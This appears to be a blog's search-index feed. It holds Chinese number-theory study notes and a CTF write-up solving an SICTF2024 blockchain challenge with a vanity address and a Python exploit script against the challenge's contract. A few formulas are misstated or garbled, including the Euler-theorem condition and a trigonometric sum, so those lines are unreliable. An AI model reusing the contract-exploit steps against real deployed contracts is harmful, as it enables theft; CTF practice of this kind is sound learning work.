title="孙子定理（中国剩余定理）"></a>孙子定理（中国剩余定理）</h3><p>如果k≥2，而m1,m2,…mk是两个两两互素的k个正整数，也就是说，在这k个正整数中任意取出两个正整数来，则这两个正整数是互素的，令<br>$$<br>M&#x3D;m_1m_2…m_k&#x3D;m_1M_1&#x3D;m_2M_2&#x3D;…&#x3D;m_kM_k<br>$$<br>则同时满足同余式组<br>$$<br>x\equiv b_1(mod\ m_1),x\equiv b_2(mod\ m_2),…,x\equiv b_k(mod\ m_k)<br>$$<br>的正整数解是<br>$$<br>x\equiv b_1M’_1M_1+b_2M’_2M_2+…+b_kM’_kM_k(mod\ M)<br>$$<br>这里M’i是满足同余式<br>$$<br>M’_iM_i\equiv 1(mod\ m_i)<br>$$<br>的正整数解，i&#x3D;1,2,…,k</p><p>其实百度百科上说的也不错：</p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229002625329.png" alt="image-20240229002625329"></p><p>根据不同的情况，中国剩余定理可以有不同的使用，但基本情况就是如上，对照着搓一下代码应该不难。</p><h2 id="第五章-剩余系，欧拉定理，费马定理及其应用"><a href="#第五章-剩余系，欧拉定理，费马定理及其应用" class="headerlink" title="第五章 剩余系，欧拉定理，费马定理及其应用"></a>第五章 剩余系，欧拉定理，费马定理及其应用</h2><h3 id="完全剩余系"><a href="#完全剩余系" class="headerlink" title="完全剩余系"></a>完全剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302002055889.png" alt="image-20240302002055889"></p><h3 id="一些结论-2"><a href="#一些结论-2" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>设m是一个大于1的整数，b是一个整数且满足条件(b,m)&#x3D;1.如果a1,a2,…am是模m的一个完全剩余系，则ba1,ba2,…,bam也是模m的一个完全剩余系</p><h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>设m是一个大于1的整数，而b,c是两个任意的整数但满足条件(b,m)&#x3D;1，如果a1,a2,…,am是模m的一个完全剩余系，则ba1+c,ba2+c,…,bam+c也是模m的一个完全剩余系</p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>如果m是一个大于1的整数而a,b是任意的两个整数，使得<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，则有gcd(a,m)&#x3D;gcd(b,m)</p><h3 id="欧拉函数φ-m"><a href="#欧拉函数φ-m" class="headerlink" title="欧拉函数φ(m)"></a>欧拉函数φ(m)</h3><p>我们用φ(m)来表示不大于m而和m互素的正整数的个数。我们把φ(m)叫做欧拉函数。其中φ(1)&#x3D;1</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设l是一个正整数，p是一个素数，则我们有<br>$$<br>\varphi(p^l)&#x3D;p^{l-1}(p-1)<br>$$</p><h3 id="简化剩余系"><a href="#简化剩余系" class="headerlink" title="简化剩余系"></a>简化剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145523366.png" alt="image-20240302145523366"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145531674.png" alt="image-20240302145531674"></p><h3 id="一个结论"><a href="#一个结论" class="headerlink" title="一个结论"></a>一个结论</h3><p>设m是一个大于1的整数，a是一个整数且满足条件gcd(a,m)&#x3D;1.如果b1,b2,…bφ(m)是模m的一个简化剩余系，则<br>$$<br>ab_1,ab_2,…,ab_{\varphi (m)}<br>$$<br>也是模m的一个简化剩余系</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>设m是一个大于1的整数，a是一个素数且满足条件gcd(a,m)&#x3D;1，则我们有<br>$$<br>a^{\varphi(m)}\equiv 1(mod\ m)<br>$$<br>上式在RSA算法中有重要作用</p><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>对于欧拉定理有一种特殊情况，那就是当模m为素数是时，此时就可以得到费马小定理<br>$$<br>a^{p-1}\equiv 1(mod\ p)<br>$$</p><h2 id="第六章-小数、分数和实数"><a href="#第六章-小数、分数和实数" class="headerlink" title="第六章 小数、分数和实数"></a>第六章 小数、分数和实数</h2><h3 id="一些结论-3"><a href="#一些结论-3" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.如果a&#x2F;b能表示成纯循环小数，则我们有gcd(b,10)&#x3D;1</p><h4 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则a&#x2F;b能表示成纯循环小数0.a1…ah</p><h4 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h4><p>设b是一个正整数且gcd(10,b)&#x3D;1，令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则有h|φ(b)</p><h4 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h4><p>设a,b,b1都是正整数，a&lt;b，gcd(a,b)&#x3D;1，b1&gt;1，gcd(b1,10)&#x3D;1.b&#x3D;2^α5^βb1，其中α,β都是非负整数但不同时为0.令h是一个最小的正整数且能使<br>$$<br>10^h\equiv 1(mod\ b_1)<br>$$<br>则当α≥β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_t…a_a\dot a_\alpha…\dot a_{\alpha+h}<br>$$<br>而当α＜β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_1…a_\beta \dot a_{\beta+1}…\dot a_{\beta+h}<br>$$</p><h2 id="第七章-连分数和数论分数"><a href="#第七章-连分数和数论分数" class="headerlink" title="第七章 连分数和数论分数"></a>第七章 连分数和数论分数</h2><h3 id="连分数"><a href="#连分数" class="headerlink" title="连分数"></a>连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302235054370.png" alt="image-20240302235054370"></p><p>当1≤k≤n是一个整数时，我们把[a1,a2,…,ak]&#x3D;pk&#x2F;qk叫做(22)的第k个渐进分数。</p><h3 id="一些结论-4"><a href="#一些结论-4" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h4><p>设n≥3和连分数[a1,a2,…an]的渐进分数是p1&#x2F;q1,p2&#x2F;q2,…,pn&#x2F;qn,则在这些剪辑分数之间，下面的关系式成立<br>$$<br>p_1&#x3D;a_1,q_1&#x3D;1,p_2&#x3D;a_1a_2+1,q_2&#x3D;a_2<br>$$<br>而当3≤k≤n时，则有<br>$$<br>p_k&#x3D;a_kp_{k-1}+p_{k-2},q_k&#x3D;a_kq_{k-1}+q_{k-2}<br>$$</p><h4 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h4><p>如果连分数[a1,a2,…,an]的n个渐进分数是pk&#x2F;qk（其中k&#x3D;1,2,…,n），则当k≥2时我们有<br>$$<br>p_kq_{k-1}-p_{k-1}q_k&#x3D;(-1)^k<br>$$<br>而当k≥3时我们有<br>$$<br>p_kq_{k-2}-p_{k-2}q_k&#x3D;(-1)^{k-1}a_k<br>$$</p><h4 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h4><p>每一个有理数都能够表示成为有限连分数</p><h4 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h4><p>设[a1,a2,…,an…]是一个无限连分数，pk&#x2F;qk(k&#x3D;1,2,…)是它的第k个渐进分数，则当k≥2时我们有<br>$$<br>\frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}<br>$$</p><p>当k→∞时，pk&#x2F;qk有一极限，则我们有<br>$$<br>\frac{p_1}{q_1}&lt;\frac{p_3}{q_3}&lt;\frac{p_5}{q_5}&lt;…&lt;[a_1,a_2,…,a_n…]&lt;…&lt;\frac{p_6}{q_6}&lt;\frac{p_4}{q_4}&lt;\frac{p_2}{q_2}<br>$$</p><h3 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h3><p>设x是任何一个实数，我们用[x]来表示不大于x的最大整数，我们用{x}表示x-[x]</p><p>有如下性质：</p><p>(1) x&#x3D;[x]+{x},x-1&lt;[x]≤x</p><p>(2) 当n是一个整数时，我们有[n+x]&#x3D;n+[x]</p><p>(3) 当0≤x&lt;1时，有[x]&#x3D;0</p><h3 id="循环连分数"><a href="#循环连分数" class="headerlink" title="循环连分数"></a>循环连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303145246724.png" alt="image-20240303145246724"></p><h3 id="x-x-的一些性质"><a href="#x-x-的一些性质" class="headerlink" title="[x],{x}的一些性质"></a>[x],{x}的一些性质</h3><h4 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h4><p>$$<br>[x]+[y]\leq [x+y],{x}+{y}\geq {x+y}<br>$$</p><p>$$<br>[-x]&#x3D;\begin{cases} -[x]+1, 当x不是整数时 \ -[x], 当x是整数时 \end{cases}<br>$$</p><h4 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h4><p>设n是任一个正整数而α是一个实数时，则有<br>$$<br>[\alpha]+[\alpha+\frac{1}{n}]+…+[\alpha+\frac{n-1}{n}]&#x3D;[n\alpha]<br>$$<br>成立</p><h4 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h4><p>设a,b是两个整数，b&gt;0，则有<br>$$<br>a&#x3D;b[\frac{a}{b}]+b{\frac{a}{b}},0\leq b{\frac{a}{b}}\leq b-1<br>$$</p><h4 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h4><p>我们有<br>$$<br>[2x]+[2y]\geq [x]+[y]+[x+y]<br>$$</p><h3 id="一些数论函数"><a href="#一些数论函数" class="headerlink" title="一些数论函数"></a>一些数论函数</h3><p>除了前面提到过的欧拉函数和取整函数以外，我们还有一些数论函数</p><h4 id="除数函数"><a href="#除数函数" class="headerlink" title="除数函数"></a>除数函数</h4><p>如果n是一个正整数，我们用d(n)来表示n的因数的个数。我们把d(n)叫做除数函数。</p><h5 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm都是不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>d(n)&#x3D;(\alpha_1+1)…(\alpha_m+1)<br>$$</p><h5 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h5><p>设a,b是两个正整数而gcd(a,b)&#x3D;1，则我们有<br>$$<br>d(ab)&#x3D;d(a)d(b)<br>$$</p><h4 id="因数和"><a href="#因数和" class="headerlink" title="因数和"></a>因数和</h4><p>如果n是一个正整数，则我们把n的所有因数相加以后所得到的和叫做n的因数和，记作σ(n)</p><h5 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h5><p>设m,n是两个正整数且gcd(m,n)&#x3D;1，则我们有<br>$$<br>\sigma (mn)&#x3D;\sigma(m)\cdot\sigma(n)<br>$$</p><h4 id="真因数"><a href="#真因数" class="headerlink" title="真因数"></a>真因数</h4><p>如果n是一个正整数，则我们把除去n本身以外的n的因数都叫作n的真因数</p><h4 id="完全数"><a href="#完全数" class="headerlink" title="完全数"></a>完全数</h4><p>如果n是一个正整数，当我们把n的所有真因数相加以后，所得到的和恰好等于n时，则我们把n叫作完全数。或者说当σ(n)&#x3D;2n成立时，则我们把n叫作完全数。</p><h5 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h5><p>如果n是一个≥2的整数而2^n-1是一个素数，则<br>$$<br>2^{n-1}(2^n-1)<br>$$<br>是一个完全数</p><h4 id="σ和d的联系"><a href="#σ和d的联系" class="headerlink" title="σ和d的联系"></a>σ和d的联系</h4><p>如果n是一个正整数而λ是一个非负整数，则令<br>$$<br>\sigma_\lambda(n)&#x3D;\sum_{d|n}d^\lambda<br>$$<br>设m是一个整数，令m^0&#x3D;1，我们有<br>$$<br>\sigma_0(n)&#x3D;d(n)<br>$$<br>另外<br>$$<br>\sigma_1(n)&#x3D;\sigma(n)<br>$$</p><h4 id="莫比乌斯函数"><a href="#莫比乌斯函数" class="headerlink" title="莫比乌斯函数"></a>莫比乌斯函数</h4><p>$$<br>\mu(n)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ (-1)^r,当n是r个不同的素数的乘积时 \ 0,当n能被一个素数的平方除尽时\end{cases}<br>$$</p><h5 id="1-9"><a href="#1-9" class="headerlink" title="1"></a>1</h5><p>如果m,n是两个正整数而gcd(m,n)&#x3D;1，则我们有<br>$$<br>\mu(mn)&#x3D;\mu(m)\cdot\mu(n)<br>$$</p><h5 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h5><p>我们有<br>$$<br>\sum_{d|n}\mu(d)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ 0,当n&gt;1时\end{cases}<br>$$</p><h5 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm是m个不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>\sum_{d|n}|\mu(d)|&#x3D;2^m<br>$$</p><h2 id="第八章-关于复数和三角和的概念"><a href="#第八章-关于复数和三角和的概念" class="headerlink" title="第八章  关于复数和三角和的概念"></a>第八章  关于复数和三角和的概念</h2><h3 id="三角函数泰勒公式"><a href="#三角函数泰勒公式" class="headerlink" title="三角函数泰勒公式"></a>三角函数泰勒公式</h3><p>这里贴一下三角函数泰勒公式<img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175243666.png" alt="image-20240303175243666"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175252488.png" alt="image-20240303175252488"></p><h3 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h3><p>$$<br>e^{i\theta}&#x3D;cos\theta+isin\theta<br>$$</p><p>并且由此可以推知，<br>$$<br>|e^{i\theta}|&#x3D;\sqrt{cos^2\theta+sin^2\theta}&#x3D;1<br>$$</p><h3 id="负数的指数式"><a href="#负数的指数式" class="headerlink" title="负数的指数式"></a>负数的指数式</h3><p>根据上面的欧拉公式，复数z&#x3D;r(cosθ+isinθ)可以表示为简单形式<br>$$<br>z&#x3D;re^{i\theta}<br>$$</p><h3 id="一些结论-5"><a href="#一些结论-5" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-10"><a href="#1-10" class="headerlink" title="1"></a>1</h4><p>设θ1和θ2是两个实数，则我们有<br>$$<br>e^{i(\theta_1+\theta_2)}&#x3D;e^{i\theta_1}\cdot e^{i\theta_2}<br>$$</p><h4 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h4><p>设n是一个正整数而z&#x3D;a+bi是一个复数，则当z≠1时我们有<br>$$<br>\sum_{m&#x3D;0}^n{z^m}&#x3D;\frac{1-z^{n+1}}{1-z}<br>$$</p><h4 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h4><p>我们有<br>$$<br>\sum_{m&#x3D;0}^{n-1}{e^{i(\theta+\frac{n-1}{2}\varphi)}}\cdot\frac{sin\frac{n\varphi}{2}}{sin\frac{\varphi}{2}}<br>$$<br>其中n是一个正整数，φ≠2lπ，其中l是任一个整数，即{φ&#x2F;2x}≠0</p><h2 id="（也许暂时的）结尾"><a href="#（也许暂时的）结尾" class="headerlink" title="（也许暂时的）结尾"></a>（也许暂时的）结尾</h2><p>以上是本人读了前两册《初等数论》后记录的笔记。第二册的三角和部分及最后一册暂且先不读了，以后有需要再读了做补充。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次上链</title>
      <link href="/posts/d93c1104/"/>
      <url>/posts/d93c1104/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于SICTF2024 #Round 3 Blockchain方向的CheckinNewYear</p><p>当时这题没做出来，现在根据official writeup进行了一次复盘（</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/images/记第一次上链/屏幕截图 2024-02-22 235215.png" alt="屏幕截图 2024-02-22 235215" style="zoom:50%;" /><p>如何注册使用metamask这里不再赘述，remix IDE网站：<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>先生成一个deployer account:</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012955732.png" alt="image-20240223012955732"></p><p>按照要求给这个账户去水龙头接点水，不然就会无法支付2中部署合约时产生的费用</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013024832.png" alt="image-20240223013024832"></p><p>部署一下题目的智能合约，得到合约地址和token</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013113909.png" alt="image-20240223013113909"></p><p>用4查看一下合约的源代码</p><img src="/images/记第一次上链/屏幕截图 2024-02-23 004703.png" alt="屏幕截图 2024-02-23 004703" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        2**16 * 3**3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 ==</span><br><span class="line">        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959</span><br><span class="line">        ,&quot;Not this Year&quot;);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (bool)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(&quot;Happy&quot;)),&quot;not HappyNewYear&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码逻辑，发现其中对用户的地址有限制。这里用两串较长的式子进行了简单的混淆，经过计算不难发现，这里的限制是要求用户地址的最后四位是2024。</p><p>在这里，official writeup中给出了一个可以专门用来生成指定形式地址的网站：<a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a></p><blockquote><p>比赛期间做的时候就是卡在这里了，学长发了我exp.sol我都不会用。。。没想到其实有这么方便的网站~（T0T)</p></blockquote><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223183457544.png" alt="image-20240223183457544"></p><p>接下来只要给isSolved函数的NewYear值传一个”Happy”字符串就可以了</p><h2 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h2><p>官方给出的exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> compile_file</span><br><span class="line">entrant_abi, entrant_bytecode = compile_file(<span class="string">&quot;Example.sol&quot;</span>, <span class="string">&quot;HappyNewYear&quot;</span>,</span><br><span class="line"><span class="string">&quot;0.8.9&quot;</span>)[<span class="string">&#x27;HappyNewYear&#x27;</span>]  <span class="comment">#确保Example.sol跟这个py文件在同一路径下</span></span><br><span class="line">conn = Connection(<span class="string">&#x27;http://124.221.86.119:40002&#x27;</span>)</span><br><span class="line">existing_account =conn.account(<span class="string">&quot;...&quot;</span>)  <span class="comment">#这里是填写上面生成的账号的Private Key</span></span><br><span class="line">target_address = <span class="string">&quot;0x3C58Ec40D7E79BEf9c7987b7c5414b0B13CcEDEe&quot;</span>  <span class="comment">#合约地址</span></span><br><span class="line">entrant_contract = conn.contract(</span><br><span class="line">existing_account,</span><br><span class="line">address=target_address,</span><br><span class="line">abi=entrant_abi</span><br><span class="line">)</span><br><span class="line">entrant_contract.functions.happyNewYear(<span class="string">&quot;Happy&quot;</span>).send_transaction()</span><br></pre></td></tr></table></figure><p>成功运行以后只要去nc的3中查看即可</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p><h2 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h2><p>新进一个test.sol文件，把得到的合约源码复制进去</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010958373.png" alt="image-20240223010958373"></p><p>编译一下，注意compiler的版本，绿色的√出现即为编译成功</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223011101264.png" alt="image-20240223011101264"></p><p>在metamask上手动添加网络，网络名称随便写，RPC题目中的复制过来（记得加上http），链ID随便写，保存的时候它会教你做事，货币符号随便写</p><blockquote><p>由于之前做题的时候添加过了，这里有个报错</p></blockquote><img src="/images/记第一次上链/image-20240223011626597.png" alt="image-20240223011626597" style="zoom:50%;" /><p>在添加账户中导入账户，填写上面生成的账户的Private Key</p><img src="/images/记第一次上链/image-20240223011806125.png" alt="image-20240223011806125" style="zoom:50%;" /><p>开始将智能合约部署上链，ENVIRONMENT选Inject Provider - MetaMask，确保自己连入的是那个2024结尾的账户（点那个地球的标志查看），At Address填入合约地址，然后点一下At Address，给happyNewYear传一个Happy，然后点一下happyNewYear，确认交易，大功告成！</p><img src="/images/记第一次上链/image-20240223012042008.png" alt="image-20240223012042008" style="zoom:50%;" /><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012345867.png" alt="image-20240223012345867"></p><img src="/images/记第一次上链/image-20240223012407277.png" alt="image-20240223012407277" style="zoom:50%;" /><p>nc一下查看3即可看到flag</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round3 Writeup</title>
      <link href="/posts/5a11c057/"/>
      <url>/posts/5a11c057/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/SICTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“[签到]签到” and “WHO?WHO?WHO” in “Misc”, “[Game][Battle City]“ in “Reverse” ,and “Forensics” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2024 Writeup</title>
      <link href="/posts/d8633326/"/>
      <url>/posts/d8633326/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024 Writeup</title>
      <link href="/posts/fabac5e4/"/>
      <url>/posts/fabac5e4/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/BeginCTF2024_Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023 Writeup</title>
      <link href="/posts/d40cd373/"/>
      <url>/posts/d40cd373/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NCTF2023_Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“Web” was written by <strong>wuming</strong></p><p>“Reverse” was written by <strong>fermata</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 Writeup</title>
      <link href="/posts/58e12fb0/"/>
      <url>/posts/58e12fb0/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Hello, world!</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
